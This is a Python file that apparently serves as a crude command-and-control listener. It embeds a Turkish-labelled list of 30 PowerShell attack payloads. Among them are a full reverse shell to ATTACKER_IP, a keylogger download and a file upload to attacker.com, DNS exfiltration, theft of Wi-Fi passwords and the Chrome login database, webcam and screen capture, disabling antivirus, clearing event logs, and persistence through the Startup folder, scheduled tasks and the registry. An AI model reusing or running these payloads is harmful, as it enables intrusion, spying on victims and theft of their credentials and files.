import socket

# PowerShell Payload
pyload = r'''
⚙️ PowerShell Payload Listesi (30 Adet)
🖥️ 1. Sistem Bilgisi

Get-ComputerInfo | Out-String

🌐 2. Ağ Bilgisi

ipconfig /all; netstat -ano

🔐 3. Wi-Fi Şifreleri

(netsh wlan show profiles) | ForEach-Object {
  $name = ($_ -split ":")[1].Trim()
  netsh wlan show profile name="$name" key=clear
}

💾 4. Chrome Parola DB’sini Kopyala

Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "C:\Temp\logins.db"

📸 5. Ekran Görüntüsü Al

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bmp = New-Object System.Drawing.Bitmap(1024,768)
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen(0,0,0,0,$bmp.Size)
$bmp.Save("C:\Temp\screenshot.png")

📷 6. Webcam Görüntüsü Al (ffmpeg ile)

Start-Process "cmd.exe" "/c ffmpeg -f dshow -i video=""Integrated Camera"" -frames:v 1 webcam.jpg"

⌨️ 7. Keylogger (3rd-party ile)

Invoke-WebRequest -Uri "http://attacker.com/keylogger.exe" -OutFile "$env:TEMP\kl.exe"; Start-Process "$env:TEMP\kl.exe"

🔁 8. Reverse Shell

$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()
}

🧠 9. RAM’deki Şifreleri veya Tarayıcıları Tara

Get-Process | Where-Object { $_.Name -match "chrome|firefox|edge" }

🗂️ 10. Klasörü Zipleyip Gönder

Compress-Archive -Path "C:\Users\Public\*" -DestinationPath "C:\Temp\public.zip"
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\Temp\public.zip" -ContentType "multipart/form-data"

🧬 11. Startup’a Kopyala (Kalıcılık)

Copy-Item ".\payload.ps1" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"

🕓 12. Görev Zamanlayıcıya Ekle

schtasks /create /tn "Backdoor" /tr "powershell -ExecutionPolicy Bypass -File C:\payload.ps1" /sc onlogon /rl highest

🧲 13. DNS Exfiltration

nslookup $(whoami).attacker.com

🪣 14. UAC Bypass Denemesi

Start-Process powershell -Verb runAs

💣 15. Base64 Payload

$e = "ZWNobyBoZWxsbyBmcm9tIGJhc2U2NA=="
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e)))

🧪 16. AV Tespiti Bypass Denemesi (basit)

Set-MpPreference -DisableRealtimeMonitoring $true

📁 17. Gizli Dosya ve Dizinleri Listele

Get-ChildItem -Force -Recurse | Where-Object { $_.Attributes -match "Hidden" }

📦 18. Remote Payload Çek & Çalıştır

iex (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")

🔍 19. Admin Yetkisini Kontrol Et

([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

🧱 20. VM Tespiti (Model Adı)

Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model

🪐 21. Public IP Adresini Al

Invoke-RestMethod http://ipinfo.io/ip

💡 22. USB Cihazlarını Tara

Get-PnpDevice -Class USB

🪤 23. Log Temizleme (EventLog)

wevtutil el | Foreach-Object {wevtutil cl "$_"}

🔧 24. Process’leri Listele

Get-Process | Sort-Object CPU -Descending | Select -First 10

🧹 25. Clipboard Verisini Al

Add-Type -AssemblyName System.Windows.Forms
[Windows.Forms.Clipboard]::GetText()

🪟 26. Açık Pencereleri Listele

Get-Process | Where-Object { $_.MainWindowTitle }

🔇 27. Mikrofon Cihazlarını Listele

Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Microphone*" }

🧬 28. Powershell Script Çalıştırma İzinlerini Kapatmak

Set-ExecutionPolicy Restricted -Force

⌛ 29. 5 Dakika Sonra Reverse Shell Aç

Start-Sleep -Seconds 300; iex (New-Object Net.WebClient).DownloadString("http://attacker.com/revshell.ps1")

🕳️ 30. Registry ile Kalıcılık

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Evil" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\evil.ps1"

...
'''  # You can keep the full payload text here.

HOST = '0.0.0.0'
PORT = 12345

def start_server():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"Server started on {HOST}:{PORT}")
        
        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Connection from {client_address} has been established.")
            
            # Print the PowerShell payload (just printing, not sending)
            print("PowerShell Payload:")
            print(pyload)
            
            # Receive command from user to send to client
            command = input("Enter the command to send to the client: ")
            
            # Send the user's command to the client
            client_socket.sendall(command.encode())
            
            # Receive and display the response from the client
            response = client_socket.recv(1024).decode()
            print(f"Response from client: {response}")
            
            # Close the connection with the client
            client_socket.close()
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server_socket.close()

if __name__ == '__main__':
    start_server()

